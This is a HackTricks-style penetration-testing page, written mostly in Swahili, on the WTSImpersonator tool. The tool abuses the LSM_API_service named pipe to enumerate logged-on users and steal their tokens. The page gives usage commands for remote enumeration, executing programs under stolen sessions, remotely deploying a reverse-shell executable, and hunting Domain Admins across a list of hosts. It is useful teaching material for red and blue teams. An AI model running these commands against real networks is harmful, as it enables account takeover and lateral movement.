{{#include ../../banners/hacktricks-training.md}}

Chombo cha **WTS Impersonator** kinatumia **"\\pipe\LSM_API_service"** RPC Named pipe ili kuhesabu kwa siri watumiaji walioingia na kuchukua token zao, ikiepuka mbinu za jadi za Token Impersonation. Njia hii inarahisisha harakati za upande mmoja ndani ya mitandao. Ubunifu wa mbinu hii unahusishwa na **Omri Baso, ambaye kazi yake inapatikana kwenye [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Msingi wa Kazi

Chombo kinatumika kupitia mfululizo wa API calls:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage

- **Enumerating Users**: Utekelezaji wa kuorodhesha watumiaji wa ndani na wa mbali unapatikana kwa zana, kwa kutumia amri kwa kila hali:

- Locally:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotely, by specifying an IP address or hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Moduli za `exec` na `exec-remote` zinahitaji muktadha wa **Service** ili kufanya kazi. Utekelezaji wa ndani unahitaji tu executable ya WTSImpersonator na amri:

- Mfano wa utekelezaji wa amri za ndani:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe inaweza kutumika kupata muktadha wa huduma:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Inahusisha kuunda na kufunga huduma kwa mbali kama PsExec.exe, ikiruhusu utekelezaji kwa ruhusa zinazofaa.

- Mfano wa utekelezaji wa mbali:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Inalenga watumiaji maalum kwenye mashine nyingi, ikitekeleza msimbo chini ya ithibati zao. Hii ni muhimu sana kwa kulenga Domain Admins wenye haki za admin za ndani kwenye mifumo kadhaa.
- Mfano wa matumizi:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
